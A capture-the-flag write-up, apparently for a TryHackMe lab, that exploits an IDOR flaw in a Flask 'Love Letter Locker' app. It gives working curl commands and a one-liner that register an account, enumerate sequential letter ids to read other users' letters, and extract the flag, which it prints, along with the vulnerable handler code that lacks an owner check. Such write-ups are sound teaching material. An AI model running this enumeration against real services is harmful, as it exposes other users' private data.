# Love Letter Locker — IDOR (Broken Object Level Authorization)

## 1. Reconnaissance

### 1.1 Fingerprint the app

```bash
curl -s -i http://10.49.140.196:5000/
```

- `Server: Werkzeug/3.1.5 Python/3.12.3` → a **Flask** app.
- `Vary: Cookie` → session/cookie‑based auth.
- The landing page ("💘 LoveLetter Locker") offers **/login** and **/register**.

### 1.2 Map the routes

Browsing the forms reveals the surface:

| Route | Method | Purpose |
|-------|--------|---------|
| `/register` | GET/POST | create account |
| `/login` | GET/POST | authenticate, sets `session` cookie |
| `/letters` | GET | list *my* letters |
| `/letters/new` | GET/POST | write a letter |
| `/letter/<id>` | GET | **view a single letter by numeric id** |
| `/logout` | GET | end session |

### 1.3 The planted hint

The `/letters` page shows two very loud clues:

```html
<p class="muted">Total letters in Cupid’s archive: <b>2</b></p>
...
<h3>Tip from Cupid 😇</h3>
<p class="muted">
  Every love letter gets a unique number in the archive.
  Numbers make everything easier to find.
</p>
```

- The archive already holds **2 letters** — but a brand‑new account owns **none**.
  Those letters belong to *other users*.
- "Every love letter gets a unique **number**... Numbers make everything easier
  to find" is a direct nudge toward **enumerating sequential IDs** → IDOR.

---

## 2. The vulnerability

Each letter is addressed by a **predictable, sequential integer** at
`/letter/<id>`. The route requires you to be **logged in**, but it never checks
that the requested letter actually **belongs to the logged‑in user**. That
missing ownership check is the bug — an **IDOR**, a.k.a. **Broken Object Level
Authorization (OWASP API1)**.

Authentication answers *"who are you?"*. Authorization answers *"are you allowed
to touch *this* object?"*. The app does the first and skips the second, so any
authenticated user can read **every** letter simply by changing the number.

---

## 3. Exploitation

### 3.1 Create an account and log in (keep the session cookie)

```bash
U="hacker$RANDOM"; P="secret123"

# Register
curl -s -c jar.txt \
     -d "username=$U&password=$P" \
     http://10.49.140.196:5000/register

# Log in — stores the signed Flask `session` cookie in jar.txt
curl -s -c jar.txt -b jar.txt \
     -d "username=$U&password=$P" \
     http://10.49.140.196:5000/login
```

Successful login redirects to `/letters` and sets a `session` cookie.

### 3.2 Learn the object‑ID scheme

Create one letter of our own to see what id we are assigned:

```bash
curl -s -b jar.txt -c jar.txt \
     --data-urlencode "title=mytest" \
     --data-urlencode "body=hello world" \
     http://10.49.140.196:5000/letters/new

curl -s -b jar.txt http://10.49.140.196:5000/letters | grep -oE '/letter/[0-9]+'
# -> /letter/3
```

Our own letter is **#3**, and the archive total is now 3. Therefore letters
**#1** and **#2** are objects owned by other users — the targets for IDOR.

### 3.3 Walk the IDs (the IDOR)

```bash
for id in 1 2 3; do
  echo "===== /letter/$id ====="
  curl -s -b jar.txt "http://10.49.140.196:5000/letter/$id" \
    | grep -iE '<h2|THM\{'
done
```

Output:

```
===== /letter/1 =====
  <h2>💌 To my secret Valentine ❤️</h2>
  THM{1_c4n_r3ad_4ll_l3tters_w1th_th1s_1d0r}
===== /letter/2 =====
  <h2>💌 Fear and Loving</h2>
===== /letter/3 =====
  <h2>💌 mytest</h2>
```

Letter **#1** — which belongs to another user ("Forever yours, Gonz0") — is
read straight out with our own session cookie. **Flag captured.**

### 3.4 Confirm it is an *authorization* flaw (not missing auth)

Requesting the same letter **without** a session cookie just bounces to login:

```bash
curl -s -i "http://10.49.140.196:5000/letter/1" | head -1
# HTTP/1.1 302 FOUND   (-> /login)
```

So the endpoint *does* enforce authentication; what it fails to enforce is
**object‑level authorization**. That is the textbook IDOR signature.

### 3.5 One‑liner to grab the flag end‑to‑end

```bash
H=http://10.49.140.196:5000; U="poc$RANDOM"; P=pwpwpw
curl -s -c j -d "username=$U&password=$P" $H/register >/dev/null
curl -s -c j -b j -d "username=$U&password=$P" $H/login >/dev/null
for i in $(seq 1 10); do curl -s -b j "$H/letter/$i"; done | grep -oE 'THM\{[^}]+\}' | sort -u
```

(We scan ids 1–10 to be safe; the loop prints any flag it finds.)

---

## 4. Flag

```
THM{1_c4n_r3ad_4ll_l3tters_w1th_th1s_1d0r}
```

---

## 5. Root cause

In Flask terms, the vulnerable handler looks essentially like this:

```python
@app.route("/letter/<int:lid>")
@login_required                       # ✅ checks you are logged in
def letter(lid):
    row = db.execute("SELECT * FROM letters WHERE id = ?", (lid,)).fetchone()
    return render_template("letter.html", letter=row)   # ❌ no owner check
```

The query selects by `id` alone. It never filters on, or compares against, the
current user's id — so object access is decided entirely by the client‑supplied
`lid`. Sequential integer ids make enumerating every object trivial.
